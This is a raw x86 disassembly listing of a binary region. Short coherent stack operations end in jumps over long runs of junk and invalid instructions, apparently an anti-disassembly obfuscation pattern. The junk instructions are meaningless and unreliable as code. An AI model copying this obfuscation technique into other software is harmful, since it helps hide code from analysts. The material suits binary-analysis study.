  402121:	cmp    BYTE PTR [esi+edi*8-0x68],bh
  402125:	sub    ah,BYTE PTR [ebp-0x3d]
  402128:	push   ecx
  402129:	shl    BYTE PTR [edx+edi*8-0xaf12d67],0xce
  402131:	sbb    al,0x9c
  402133:	out    0x3f,al
  402135:	add    esi,DWORD PTR [eax]
  402137:	int    0xbb
  402139:	scas   al,BYTE PTR es:[edi]
  40213a:	inc    edi
  40213b:	cmp    BYTE PTR [eax],ah
  40213d:	adc    BYTE PTR [esi],bh
  40213f:	mov    edi,0x272752d3
  402144:	mov    dh,0x82
  402146:	sbb    ebp,DWORD PTR [esp+esi*1-0x5a9160bc]
  40214d:	stos   BYTE PTR es:[edi],al
  40214e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40214f:	push   eax
  402150:	mov    eax,DWORD PTR [ebp-0x18]
  402153:	add    eax,0xaa
  402158:	jmp    0x4022f9
  40215d:	cmc    
  40215e:	dec    ebx
  40215f:	and    eax,0x7570a1be
  402164:	jno    0x402191
  402166:	push   ds
  402167:	mov    ch,0x76
  402169:	loop   0x402121
  40216b:	lds    edx,FWORD PTR [ecx+0x1e]
  40216e:	add    bh,BYTE PTR [esi+0x7e]
  402171:	cli    
  402172:	jg     0x4021f2
  402174:	jle    0x402118
  402176:	lods   eax,DWORD PTR ds:[esi]
  402177:	ror    edx,0xed
  40217a:	mov    edi,0x764f267b
  40217f:	jno    0x402167
  402181:	mov    esi,0xa632900a
  402186:	outs   dx,DWORD PTR ds:[esi]
  402187:	pop    esi
  402188:	rol    DWORD PTR [edx+esi*4],0x12
  40218c:	mov    ebp,0xb7d54c48
  402191:	in     eax,dx
  402192:	mov    edi,0x18352fc2
  402197:	clc    
  402198:	lea    ebp,[esp+ebp*8]
  40219b:	into   
  40219c:	bsr    esi,DWORD PTR [ecx-0x413d3255]
  4021a3:	inc    esi
  4021a4:	push   ebp
  4021a5:	sub    edi,eax
  4021a7:	add    al,0xdd
  4021a9:	out    0xb1,al
  4021ab:	call   0x8ac6:0x6c796abc
  4021b2:	push   ebp
  4021b3:	clc    
  4021b4:	int3   
  4021b5:	ret    0xa394
  4021b8:	cmp    al,0x91
  4021ba:	mov    edx,0x6d3b2abb
  4021bf:	push   ebp
  4021c0:	out    0xe5,eax
  4021c2:	(bad)  
  4021c3:	jbe    0x4021b6
  4021c5:	jo     0x4021ad
  4021c7:	or     DWORD PTR [eax-0xa],ebp
  4021ca:	cdq    
  4021cb:	popf   
  4021cc:	pop    edx
  4021cd:	inc    ecx
  4021ce:	dec    edx
  4021cf:	sbb    bh,bh
  4021d1:	xchg   DWORD PTR cs:[edx+0x44a8d7e5],edi
  4021d8:	in     eax,dx
  4021d9:	mov    bl,0x13
  4021db:	scas   al,BYTE PTR es:[edi]
  4021dc:	icebp  
  4021dd:	xor    al,BYTE PTR [ebp-0x7349f6ee]
  4021e3:	xchg   DWORD PTR ds:0xfece1e82,ebx
  4021e9:	or     DWORD PTR [edx],ebp
  4021eb:	fst    DWORD PTR [esi+esi*4]
  4021ee:	xchg   esp,eax
  4021ef:	out    dx,eax
  4021f0:	lahf   
  4021f1:	sbb    eax,eax
  4021f3:	aam    0xab
  4021f5:	inc    esp
  4021f6:	stos   BYTE PTR es:[edi],al
  4021f7:	adc    BYTE PTR ds:0xd16791a4,0x32
  4021fe:	mov    dh,0x95
  402200:	mov    bl,0x77
  402202:	sbb    al,0xba
  402204:	call   0x50fd:0x3f67be8d
  40220b:	aas    
  40220c:	popa   
  40220d:	cmp    eax,0xc12bf6dc
  402212:	push   0xffffffc5
  402214:	push   cs
  402215:	sbb    al,0xd5
  402217:	pushf  
  402218:	and    eax,esp
  40221a:	add    eax,0xec1a9883
  402220:	(bad)  
  402221:	cmp    eax,0xd975c670
  402226:	sub    BYTE PTR [eax+0x6f70fc33],0x82
  40222d:	sahf   
  40222e:	jns    0x40228a
  402230:	mov    esp,0xbee7938a
  402235:	test   eax,0xc6d8c4ee
  40223a:	inc    esp
  40223b:	xor    al,BYTE PTR [esi-0x62]
  40223e:	mov    ah,0x65
  402240:	mov    ds:0x2112bb8,eax
  402245:	adc    BYTE PTR [eax+0x3e030ea4],bh
  40224b:	aam    0x65
  40224d:	mov    ecx,0xeb385c9d
  402252:	and    esp,DWORD PTR fs:[esi+0x7c]
  402256:	in     eax,0x63
  402258:	stc    
  402259:	push   0x3d
  40225b:	push   ecx
  40225c:	popf   
  40225d:	mov    ch,0x2e
  40225f:	add    al,0xb0
  402261:	mov    WORD PTR [edx],ds
  402263:	jge    0x402286
  402265:	xor    al,0x10
  402267:	pop    DWORD PTR [ebx+0x77]
  40226a:	xchg   edx,eax
  40226b:	pop    edx
  40226c:	lds    esp,FWORD PTR [eax+0x45]
  40226f:	jae    0x4021ff
  402271:	push   edx
  402272:	pop    esp
  402273:	test   BYTE PTR [ebx+0x37],dh
  402276:	ins    DWORD PTR es:[edi],dx
  402277:	mov    ecx,0xcc506d2c
  40227c:	push   cs
  40227d:	in     al,0xa0
  40227f:	rcr    ah,0xde
  402282:	cmp    eax,0x14e314ed
  402287:	(bad)  [edx+0x1d]
  40228a:	leave  
  40228b:	or     dl,BYTE PTR ds:0x5a46897
  402291:	xchg   esi,eax
  402292:	inc    ebp
  402293:	cmp    al,0x94
  402295:	jg     0x40221c
  402297:	call   0xbe15ad0e
  40229c:	xchg   esi,eax
  40229d:	test   al,0x5a
  40229f:	sub    BYTE PTR [ebp-0x80],ch
  4022a2:	mov    eax,ds:0x131892a4
  4022a7:	rcr    DWORD PTR [eax-0x62794913],cl
  4022ad:	mov    edi,0x861a63f8
  4022b2:	mov    al,ds:0xb5f94a6
  4022b7:	mov    eax,DWORD PTR [ecx-0x7507dd5b]
  4022bd:	out    dx,eax
  4022be:	icebp  
  4022bf:	(bad)  
  4022c1:	mov    cl,0xcc
  4022c3:	mov    ebp,ecx
  4022c5:	rol    BYTE PTR [eax-0x79111f60],1
  4022cb:	ror    DWORD PTR [esi-0x40f2cfb8],cl
  4022d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4022d2:	ins    BYTE PTR es:[edi],dx
  4022d3:	(bad)  [ebp-0x6475c97c]
  4022d9:	adc    eax,0xcfd9141e
  4022de:	push   edx
  4022df:	and    eax,0xc2bf18ff
  4022e4:	sahf   
  4022e5:	jl     0x402350
  4022e7:	repnz fadd DWORD PTR [edi-0xa]
  4022eb:	test   eax,0xa91c0fab
  4022f0:	cwde   
  4022f1:	ret    0x686f
  4022f4:	push   ebp
  4022f5:	shl    BYTE PTR [eax-0x5a],1
  4022f8:	ins    DWORD PTR es:[edi],dx
  4022f9:	push   eax
  4022fa:	mov    eax,DWORD PTR [ebp-0x18]
  4022fd:	mov    eax,DWORD PTR [eax+0x198]
  402303:	push   DWORD PTR [eax]
  402305:	call   0x40984d
  40230a:	mov    DWORD PTR [ebp-0x4],eax
  40230d:	cmp    DWORD PTR [ebp-0x4],0x0
  402311:	lea    eax,[ebp+0x4]
  402314:	mov    DWORD PTR [ebp-0x38],eax
  402317:	je     0x40313f
  40231d:	lea    eax,[ebp-0xc]
  402320:	mov    DWORD PTR [ebp-0x30],eax
  402323:	mov    eax,DWORD PTR [ebp-0x4c]
  402326:	xor    eax,esi
  402328:	add    eax,edi
  40232a:	mov    DWORD PTR [ebp-0x34],eax
  40232d:	mov    eax,DWORD PTR [ebp-0x28]
  402330:	xor    eax,esi
  402332:	add    eax,edi
  402334:	mov    DWORD PTR [ebp-0x20],eax
  402337:	mov    eax,DWORD PTR [ebp-0x4]
  40233a:	mov    DWORD PTR [ebp-0x24],eax
  40233d:	lea    eax,[ebp-0x98]
  402343:	mov    DWORD PTR [ebp-0x8],eax
  402346:	jmp    0x4024e7
  40234b:	mov    ds:0x623e7a3a,al
  402350:	bound  esp,QWORD PTR ds:[edx-0x4a]
  402354:	fadd   DWORD PTR [ebp+0x4b]
  402357:	int    0x3d
  402359:	std    
  40235a:	lahf   
  40235b:	call   0x7e7f:0xfa7e7e03
  402362:	jle    0x402354
  402364:	cmp    DWORD PTR [ecx+0xf],edi
  402367:	nop
  402368:	add    BYTE PTR [esi-0x2559f435],ch
  40236e:	je     0x4023e4
  402370:	sub    BYTE PTR [esp+eax*1-0x1e021bec],dl
  402377:	rol    BYTE PTR [ebp+0x7d],0xbf
  40237b:	ficom  DWORD PTR [esi]
  40237d:	lds    edx,FWORD PTR [eax+0x427a95b7]
  402383:	jo     0x4023bd
  402385:	popf   
  402386:	xor    al,0x86
  402388:	inc    edi
  402389:	mov    WORD PTR [esi+0x1b7abd53],ss
  40238f:	adc    eax,0x2702ac68
  402394:	retf   
  402395:	test   DWORD PTR [eax],edi
  402397:	xor    BYTE PTR [edx+0x3895540d],bl
  40239d:	lds    ecx,FWORD PTR [ecx+0xa]
  4023a0:	adc    al,0x56
  4023a2:	out    dx,eax
  4023a3:	addr16 ret 
  4023a5:	imul   edx,DWORD PTR [esi],0xac27272
  4023ab:	scas   eax,DWORD PTR es:[edi]
  4023ac:	fnstsw WORD PTR [eax-0x250c1690]
  4023b2:	outs   dx,DWORD PTR ds:[esi]
  4023b3:	sbb    eax,DWORD PTR [ebx-0x5e]
  4023b6:	in     eax,dx
  4023b7:	inc    eax
  4023b8:	inc    ebp
  4023b9:	out    dx,eax
  4023ba:	and    eax,0xb4b2ec91
  4023bf:	fiadd  DWORD PTR [ebx-0x80]
  4023c2:	mov    ebx,0xb7eeb9ae
  4023c7:	mov    bl,0x6c
  4023c9:	sbb    eax,0xa53016dd
  4023ce:	rcl    DWORD PTR [ebp+eax*8+0x52],0x30
  4023d3:	fdivr  st,st(0)
  4023d5:	bound  edi,QWORD PTR ss:[ebp-0x2d736d8b]
  4023dc:	dec    cx
  4023de:	push   es
  4023df:	adc    eax,0x20c2c402
  4023e4:	jge    0x40238d
  4023e6:	sbb    al,0x5a
  4023e8:	vmulsd xmm1{k3}{z},xmm3,(bad)
  4023e9:	loope  0x402392
  4023eb:	fwait
  4023ec:	pop    ecx
  4023ed:	dec    ecx
  4023ee:	mov    eax,ds:0xc1c4b41f
  4023f3:	ror    BYTE PTR [eax],cl
  4023f5:	cmp    eax,0xe79d8b95
  4023fa:	int3   
  4023fb:	or     al,0x9
  4023fd:	ret    
  4023fe:	pop    esp
  4023ff:	leave  
  402400:	cmp    eax,0x832b2b4d
  402405:	push   0x29
  402407:	loopne 0x4023fe
  402409:	xor    eax,0x324813d2
  40240e:	mov    ds:0xf3250ff3,al
  402413:	and    eax,0x5dfdf7b3
  402418:	mov    ah,0x83
  40241a:	(bad)  
  40241c:	arpl   si,sp
  40241e:	mov    dh,0x4f
  402420:	out    dx,eax
  402421:	mov    cl,0xc4
  402423:	sbb    DWORD PTR [esi-0x48],ecx
  402426:	gs in  eax,dx
  402428:	add    BYTE PTR [esp+ecx*4+0x4f058dc],al
  40242f:	sub    eax,0x28d3a434
  402434:	or     al,0x13
  402436:	jl     0x402474
  402438:	push   ecx
  402439:	inc    edi
  40243a:	jae    0x40242c
  40243c:	xchg   esi,eax
  40243d:	or     BYTE PTR [eax],cl
  40243f:	arpl   WORD PTR [ebx-0x5f],di
  402442:	(bad)  [ebx-0x5d]
  402445:	add    al,0x29
  402447:	or     eax,0x4b8e86d8
  40244c:	lea    eax,[ecx]
  40244e:	fldenv [ebx]
  402450:	popa   
  402451:	xchg   edx,eax
  402452:	imul   esi,edx,0x44a2ec0b
  402458:	or     dh,ch
  40245a:	mov    eax,0xfb37222d
  40245f:	xchg   DWORD PTR [esi],eax
  402461:	imul   ebp,DWORD PTR [ebx+0x6f82b43e],0x9817f714
  40246b:	sbb    dh,al
  40246d:	dec    eax
  40246e:	stc    
  40246f:	xchg   BYTE PTR [edi],dh
  402471:	pop    ecx
  402472:	and    bh,BYTE PTR [ecx]
  402474:	jle    0x402483
  402476:	fdivrp st(1),st
  402478:	ret    
  402479:	fst    DWORD PTR ds:0xc07be904
  40247f:	in     eax,0x48
  402481:	imul   ebp,ebx,0x274950fb
  402487:	mov    ch,0xfd
  402489:	cmp    BYTE PTR [edi-0x69b30101],bh
  40248f:	fldcw  WORD PTR [eax+0x426970a3]
  402495:	pop    eax
  402496:	jle    0x4024f9
  402498:	sbb    eax,0xb6430056
  40249d:	lods   al,BYTE PTR ds:[esi]
  40249e:	add    eax,0x6d0eff75
  4024a3:	repz (bad) 
  4024a5:	mov    esi,0x41c47fc5
  4024aa:	jbe    0x4024bd
  4024ac:	je     0x402521
  4024ae:	push   es
  4024af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4024b0:	repnz test DWORD PTR [edx+ecx*8],0x696cc181
  4024b8:	sahf   
  4024b9:	sti    
  4024ba:	out    0x33,eax
  4024bc:	pop    edx
  4024bd:	mov    bl,0x8a
  4024bf:	pop    esi
  4024c0:	jno    0x4024b6
  4024c2:	push   esp
  4024c3:	pushf  
  4024c4:	cmp    eax,0xf4eb2633
  4024c9:	sub    eax,0x919f93d0
  4024ce:	pop    ecx
  4024cf:	cmp    ebx,DWORD PTR ds:0xe3f586f0
  4024d5:	dec    ebx
  4024d6:	adc    DWORD PTR [esi],ebx
  4024d8:	mov    edx,0x5ab2cfe1
  4024dd:	test   al,0x6b
  4024e0:	or     ebx,DWORD PTR [esi]
  4024e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4024e3:	add    eax,0x8b8037eb
  4024e8:	inc    ebp
  4024e9:	lock mov DWORD PTR [ebp-0x10],eax
  4024ed:	mov    eax,DWORD PTR [ebp-0x1c]
  4024f0:	mov    DWORD PTR [ebp-0x40],ebx
  4024f3:	mov    DWORD PTR [ebp-0x2c],eax
  4024f6:	mov    eax,DWORD PTR [ebp-0x40]
  4024f9:	mov    ecx,DWORD PTR [ebp-0x8]
  4024fc:	jmp    0x40269d
  402501:	push   ebp
  402502:	shl    BYTE PTR [ebp+0x7159b138],1
  402508:	push   ecx
  402509:	stos   DWORD PTR es:[edi],eax
  40250a:	rol    eax,0x47
  40250d:	sub    BYTE PTR [esi+0x1267520],bl
  402513:	jle    0x402593
  402515:	cli    
  402516:	jg     0x402596
  402518:	jle    0x40257c
  40251a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40251b:	xor    eax,0x8456e003
  402520:	cwde   
  402521:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402522:	sub    eax,0x9db37b2b
  402527:	sbb    DWORD PTR [esi],esp
  402529:	and    ebp,DWORD PTR [edx+0x1c413863]
  40252f:	shl    DWORD PTR [edx],cl
  402531:	mov    esi,0x95ae22c3
  402536:	cmc    
  402537:	idiv   DWORD PTR [edx]
  402539:	sbb    al,0x71
  40253b:	mov    ch,ch
  40253d:	mov    WORD PTR [esp-0xa],ss
  402541:	loope  0x40250d
  402543:	loope  0x40257f
  402545:	pop    eax
  402546:	test   DWORD PTR [esp+esi*8+0x62],eax
  40254a:	repz icebp 
  40254c:	(bad)  
  40254d:	sub    al,0x60
  40254f:	iret   
  402550:	jmp    0x9b8:0x3341fcb0
  402557:	or     dh,bh
  402559:	jmp    0x91bf:0xc7517bb2
  402560:	jg     0x402519
  402562:	mov    edi,0xd8565f77
  402567:	clc    
  402568:	jno    0x4025d4
  40256a:	xchg   edi,eax
  40256b:	call   0x382e:0xb1f27217
  402572:	fisub  WORD PTR [ebx+0xa0aa6ef]
  402578:	call   0x4ad4:0x9af4a142
  40257f:	mov    ah,0x58
  402581:	adc    al,0x80
  402583:	loop   0x4025bc
  402585:	xor    eax,0xb6a4c873
  40258a:	dec    esp
  40258b:	addr16 lahf 
  40258d:	dec    edx
  40258e:	lock stos DWORD PTR es:[edi],eax
  402590:	and    DWORD PTR [edx-0x7a],ebx
  402593:	mov    dh,0x41
  402595:	push   es
  402596:	loopne 0x402617
  402598:	sub    bh,BYTE PTR [ebp-0x6a]
  40259b:	dec    ebp
  40259c:	pop    ds
  40259d:	sti    
  40259e:	arpl   WORD PTR [edx+0x6b],bp
  4025a1:	sub    BYTE PTR [edx+0x270c9c67],cl
  4025a7:	jl     0x402550
  4025a9:	mov    al,ds:0x78ef27e8
  4025ae:	adc    al,0x4d
  4025b0:	cmp    al,0x13
  4025b2:	push   ss
  4025b3:	fs out 0x67,eax
  4025b6:	ins    BYTE PTR es:[edi],dx
  4025b7:	inc    esp
  4025b8:	inc    esp
  4025b9:	add    al,0xe0
  4025bb:	ret    
  4025bc:	adc    ebx,DWORD PTR [eax+0x6da9917c]
  4025c2:	sbb    al,0x71
  4025c4:	or     al,0x9c
  4025c6:	arpl   WORD PTR [ecx+0x5bd91310],dx
  4025cc:	sub    DWORD PTR [edx],ecx
  4025ce:	xchg   ebx,eax
  4025cf:	cmp    al,0x92
  4025d1:	es stos DWORD PTR es:[edi],eax
  4025d3:	pusha  
  4025d4:	adc    al,0x84
  4025d6:	hlt    
  4025d7:	add    bl,BYTE PTR [esi]
  4025d9:	fsubr  st(5),st
  4025db:	das    
  4025dc:	cmp    al,BYTE PTR [esi]
  4025de:	add    eax,0x7b814e91
  4025e3:	ss ss jne 0x4025b7
  4025e7:	hlt    
  4025e8:	in     al,dx
  4025e9:	xchg   ah,bh
  4025eb:	test   eax,0xea4a5bd5
  4025f0:	mov    ah,0x98
  4025f2:	fwait
  4025f3:	out    dx,eax
  4025f4:	ins    DWORD PTR es:[edi],dx
  4025f5:	and    DWORD PTR [ebx+0x1803779a],edi
  4025fb:	add    BYTE PTR [ecx+ebx*2-0x5256883a],ch
  402602:	test   al,0x2a
  402604:	add    al,0xdc
  402606:	leave  
  402607:	inc    ecx
  402608:	retf   
  402609:	das    
  40260a:	stos   BYTE PTR es:[edi],al
  40260b:	lea    edx,[eax-0x811e5f8]
  402611:	sbb    al,0xf5
  402613:	and    BYTE PTR [ebx+0x448879fd],ah
  402619:	scas   al,BYTE PTR es:[edi]
  40261a:	mov    bh,0xa8
  40261c:	fst    DWORD PTR fs:[esi+edx*4]
  402620:	and    eax,0x40ebdca0
  402625:	test   BYTE PTR [eax],bl
  402627:	pop    es
  402628:	loopne 0x4025f6
  40262a:	xchg   esp,eax
  40262b:	adc    eax,0x8a888703
  402630:	loope  0x402650
  402632:	shr    DWORD PTR [ebp-0x23727336],0xf2
  402639:	imul   eax,DWORD PTR [edx-0x58],0xffffffa9
  40263d:	sub    BYTE PTR [ebx+ebx*2+0x26],cl
  402641:	loope  0x40260e
  402643:	int    0xb9
  402645:	imul   edi,DWORD PTR [ebx],0xffffff8e
  402648:	sub    BYTE PTR [edx-0x4817204e],al
  40264e:	call   0x131b2cf0
  402653:	mov    eax,0x95a26a39
  402658:	fnstenv [eax]
  40265a:	out    0x2f,eax
  40265c:	leave  
  40265d:	popa   
  40265e:	imul   esi,DWORD PTR [esi],0x385629f8
  402664:	ds test eax,0x61b6a34a
  40266a:	mov    ds:0xc0301ce,eax
  40266f:	test   DWORD PTR ds:0xef0fb30,0x88d96e68
  402679:	fsubr  st,st(6)
  40267b:	mov    DWORD PTR [edx],ebx
  40267d:	test   al,0x7d
  40267f:	fidivr DWORD PTR [ecx]
  402681:	retf   
  402682:	test   eax,0xdf24cd7b
  402687:	mov    edx,0xa6d3a055
  40268c:	push   ecx
  40268d:	jnp    0x402639
  40268f:	pop    ss
  402690:	xor    DWORD PTR [ecx+0x50f71a9e],edx
  402696:	dec    esi
  402697:	bound  ecx,QWORD PTR [edi]
  402699:	das    
  40269a:	lods   eax,DWORD PTR ds:[esi]
  40269b:	sbb    eax,0x5c63310
  4026a0:	fwait
  4026a1:	jb     0x4026d5
  4026a3:	add    BYTE PTR [ecx-0x23ba74ff],cl
  4026a9:	mov    ecx,DWORD PTR [ebp-0x8]
  4026ac:	mov    DWORD PTR [ecx+0x4],eax
  4026af:	mov    eax,DWORD PTR [ebp-0x20]
  4026b2:	mov    ecx,DWORD PTR [ebp-0x8]
  4026b5:	mov    DWORD PTR [ecx+0x8],eax
  4026b8:	mov    eax,DWORD PTR [ebp-0x34]
  4026bb:	mov    ecx,DWORD PTR [ebp-0x8]
  4026be:	mov    DWORD PTR [ecx+0xc],eax
  4026c1:	jmp    0x402862
  4026c6:	les    ecx,FWORD PTR [eax+0x5552d502]
  4026cc:	ror    DWORD PTR [ecx-0x7d59e5d1],1
  4026d2:	sub    eax,0xa207d7e6
  4026d7:	push   cs
  4026d8:	jle    0x402758
  4026da:	cli    
  4026db:	jg     0x40275b
  4026dd:	jle    0x4026db
  4026df:	mov    ecx,0xa5140496
  4026e4:	imul   edx,DWORD PTR ds:[edi+eax*4+0x61],0xaf4dffac
  4026ed:	xor    dl,BYTE PTR [edi-0x18]
  4026f0:	push   esi
  4026f1:	jecxz  0x402762
  4026f3:	mov    ds:0xc5215c3,al
  4026f8:	add    ebx,DWORD PTR [esi]
  4026fa:	pop    ss
  4026fb:	xor    al,0x6e
  4026fd:	out    0x5c,eax
  4026ff:	and    ch,BYTE PTR [edi-0x606992c]
  402705:	mov    esi,0x6fe64608
  40270a:	jbe    0x40276f
  40270c:	mov    ds:0xcb6e6ca9,eax
  402711:	cld    
  402712:	js     0x402767
  402714:	or     al,0x7
  402716:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402717:	dec    ebx
  402718:	fs mov ecx,0x761a9b54
  40271e:	mov    cl,0x3
  402720:	xchg   ecx,eax
  402721:	jne    0x402709
  402723:	es xor eax,0x4a24b70e
  402729:	test   BYTE PTR [esi+ebp*4],bl
  40272c:	mov    esi,0x96d50d2
  402731:	and    ch,BYTE PTR [ebp+0x6cf3835e]
  402737:	cmp    al,0x87
  402739:	imul   edi,DWORD PTR [edi],0xd7db13cc
  40273f:	aaa    
  402740:	pop    ds
  402741:	xor    al,0xad
  402743:	adc    BYTE PTR [ebx+edx*4-0x6a22bf9c],ah
  40274a:	or     eax,0x95d06879
  40274f:	out    0xc2,al
  402751:	(bad)  
  402752:	xchg   ecx,eax
  402753:	or     DWORD PTR [edi+0x4],edx
  402756:	push   esp
  402757:	in     al,dx
  402758:	aam    0xda
  40275a:	mov    edx,0x893111a5
  40275f:	lods   eax,DWORD PTR ds:[esi]
  402760:	mov    ch,0x5b
  402762:	inc    edx
  402763:	pop    ecx
  402764:	sbb    al,0x98
  402766:	cld    
  402767:	dec    ecx
  402768:	xor    dl,0x4b
  40276b:	outs   dx,BYTE PTR ds:[esi]
  40276c:	arpl   dx,bx
  40276e:	rol    dl,1
  402770:	mov    ch,0x79
  402772:	retf   
  402773:	pop    esp
  402774:	mov    al,0x60
  402776:	not    BYTE PTR [esi-0x3b]
  402779:	ret    0xbc4b
  40277c:	nop    DWORD PTR [ebx-0x66]
  402780:	popf   
  402781:	nop
  402782:	mov    cl,0xec
  402784:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402785:	pop    eax
  402786:	fidivr WORD PTR [esi+0x1c]
  402789:	ror    dl,1
  40278b:	sbb    BYTE PTR [ebp+ecx*4-0x3e220af0],al
  402792:	mov    esp,0xeb6f7984
  402797:	enter  0x83e1,0xa2
  40279b:	shl    ebx,1
  40279d:	fmul   st(3),st
  40279f:	mov    esi,0x4b6ecc22
  4027a4:	sti    
  4027a5:	and    ebp,DWORD PTR [edi*8-0x4b1f4ad2]
  4027ac:	or     al,0x62
  4027ae:	fdiv   DWORD PTR [edi+0x68da951f]
  4027b4:	fdiv   QWORD PTR [ebx]
  4027b6:	push   ebx
  4027b7:	inc    esi
  4027b8:	test   DWORD PTR [esi],ebx
  4027ba:	add    BYTE PTR [ebx+0x3cb3a707],bl
  4027c0:	push   0xffffff8a
  4027c2:	mov    dh,0xf0
  4027c4:	call   FWORD PTR [eax+eax*4+0x56452fb0]
  4027cb:	mov    ?,WORD PTR [edi+0x3cbf2047]
  4027d1:	jmp    0xc75c1930
  4027d6:	fwait
  4027d7:	push   ebx
  4027d8:	lahf   
  4027d9:	jno    0x402763
  4027db:	stos   DWORD PTR es:[edi],eax
  4027dc:	pop    ebx
  4027dd:	sar    BYTE PTR [ebp-0x69c39b3f],0x1e
  4027e4:	lods   al,BYTE PTR ds:[esi]
  4027e5:	jge    0x4027d8
  4027e7:	mov    ds:0x7c15fa88,al
  4027ec:	mov    ebx,0x34f16820
  4027f1:	xchg   esi,eax
  4027f2:	shl    dl,1
  4027f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4027f5:	and    cl,bl
  4027f7:	sub    edx,DWORD PTR [ebx-0x27212518]
  4027fd:	hlt    
  4027fe:	lods   al,BYTE PTR ds:[esi]
  4027ff:	push   ecx
  402800:	push   ds
  402801:	arpl   WORD PTR [ecx-0x55],ax
  402804:	mov    esp,0xdb147b8e
  402809:	push   ebx
  40280a:	mov    edi,0x304456dc
  40280f:	sbb    ebp,DWORD PTR [eax]
  402811:	pop    eax
  402812:	mov    eax,0x5b10e5c8
  402817:	adc    esp,DWORD PTR [edi+edx*8-0x5246e18b]
  40281e:	inc    ecx
  40281f:	or     ebp,DWORD PTR [edi]
  402821:	sti    
  402822:	cmc    
  402823:	xor    bl,dl
  402825:	scas   eax,DWORD PTR es:[edi]
  402826:	repnz hlt 
  402828:	(bad)  [esi]
  40282a:	icebp  
  40282b:	or     BYTE PTR [ebx],ah
  40282d:	and    dh,BYTE PTR [eax+0x5eadfa64]
  402833:	scas   eax,DWORD PTR es:[edi]
  402834:	mov    dl,0x14
  402836:	add    al,0x2b
  402838:	inc    eax
  402839:	pop    eax
  40283a:	shl    BYTE PTR [edx+0x74eebf65],cl
  402840:	popa   
  402841:	dec    ebp
  402842:	xchg   edx,eax
  402843:	xchg   esi,eax
  402844:	in     al,0xcf
  402846:	inc    esi
  402847:	mov    al,0x9e
  402849:	pop    edi
  40284a:	cmp    dl,BYTE PTR [edi]
  40284c:	test   DWORD PTR [edx+eax*8],0x58ab47fb
  402853:	adc    bh,0xe5
  402856:	mov    ah,0x1d
  402858:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402859:	inc    ebp
  40285a:	fld    DWORD PTR [ebp+0xcfb1ec4]
  402860:	out    dx,al
  402861:	inc    esi
  402862:	mov    eax,DWORD PTR [ebp-0x30]
  402865:	mov    ecx,DWORD PTR [ebp-0x8]
  402868:	mov    DWORD PTR [ecx+0x10],eax
  40286b:	mov    eax,eax
  40286d:	mov    eax,DWORD PTR [ebp-0x24]
  402870:	test   eax,eax
  402872:	jmp    0x402a13
  402877:	inc    edi
  402878:	push   eax
  402879:	jnp    0x402883
  40287b:	or     DWORD PTR [ecx+0x55],edx
  40287e:	push   ecx
  40287f:	adc    BYTE PTR [ebx],ch
  402881:	nop
  402882:	dec    esp
  402883:	fwait
  402884:	mov    eax,0xc2edabd
  402889:	jle    0x402909
  40288b:	cli    
  40288c:	jg     0x40290c
  40288e:	jle    0x402840
  402890:	fiadd  DWORD PTR [eax-0x5f]
  402893:	mov    eax,ds:0xf3153a38
  402898:	dec    edi
  402899:	arpl   bp,bx
  40289b:	stos   DWORD PTR es:[edi],eax
  40289c:	out    0x77,eax
  40289e:	sub    al,0xb0
  4028a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4028a1:	mov    DWORD PTR [ebx+0x4b],ecx
  4028a4:	dec    eax
  4028a5:	or     DWORD PTR [edi+0x626730a],edi
  4028ab:	xor    BYTE PTR [eax+ecx*1+0x5428a5f3],ah
  4028b2:	std    
  4028b3:	and    edx,DWORD PTR [edi]
  4028b5:	sbb    edi,DWORD PTR [eax+0x46]
  4028b8:	xor    ebx,DWORD PTR [eax-0x60]
  4028bb:	sub    BYTE PTR [edi-0x10],0x3
  4028bf:	xor    DWORD PTR [ebp-0x388ec153],ebx
  4028c5:	sbb    al,0x76
  4028c7:	push   ds
  4028c8:	nop
  4028c9:	mov    ds:0x4932b592,al
  4028ce:	aaa    
  4028cf:	pusha  
  4028d0:	mov    dl,0xff
  4028d2:	pusha  
  4028d3:	dec    eax
  4028d4:	xchg   ebp,eax
  4028d5:	inc    esi
  4028d6:	out    dx,al
  4028d7:	xchg   ecx,eax
  4028d8:	pop    esi
  4028d9:	sub    eax,DWORD PTR [ecx+0x4a29dcd5]
  4028df:	leave  
  4028e0:	or     BYTE PTR [edi+0x5d],dh
  4028e3:	pop    ebp
  4028e4:	mov    ss,ecx
  4028e6:	loopne 0x402929
  4028e8:	mov    ebx,DWORD PTR [ecx]
  4028ea:	mov    ah,BYTE PTR [edx]
  4028ec:	xlat   BYTE PTR ds:[ebx]
  4028ed:	int    0xbd
  4028ef:	or     al,0xab
  4028f1:	sbb    DWORD PTR [esi],edx
  4028f3:	(bad)  
  4028f4:	jne    0x402966
  4028f6:	addr16 xor eax,0xe79c8981
  4028fc:	js     0x4028e2
  4028fe:	(bad)  
  4028ff:	mov    ebp,DWORD PTR [ecx-0x7fb2c687]
  402905:	icebp  
  402906:	aad    0x9f
  402908:	push   ebx
  402909:	add    eax,0xf6eba079
  40290e:	sahf   
  40290f:	mov    dh,0xbd
  402911:	jbe    0x4028f7
  402913:	lods   al,BYTE PTR ds:[esi]
  402914:	out    0x99,al
  402916:	cmp    ecx,esp
  402918:	and    edi,ebp
  40291a:	outs   dx,DWORD PTR ds:[esi]
  40291b:	adc    al,ch
  40291d:	bound  ebp,QWORD PTR [esi+0x70]
  402920:	jbe    0x402919
  402922:	lahf   
  402923:	mov    ebx,0xdd437f74
  402928:	or     edx,DWORD PTR [ebp+0x1be8f72d]
  40292e:	inc    ecx
  40292f:	aaa    
  402930:	call   0x1ade9c6c
  402935:	add    al,0x84
  402937:	aam    0x2b
  402939:	bound  esp,QWORD PTR [ecx-0x7c]
  40293c:	mov    ds:0x3239b8b5,eax
  402941:	xor    eax,0x77a9b85f
  402946:	aad    0x3c
  402948:	jo     0x40290b
  40294a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
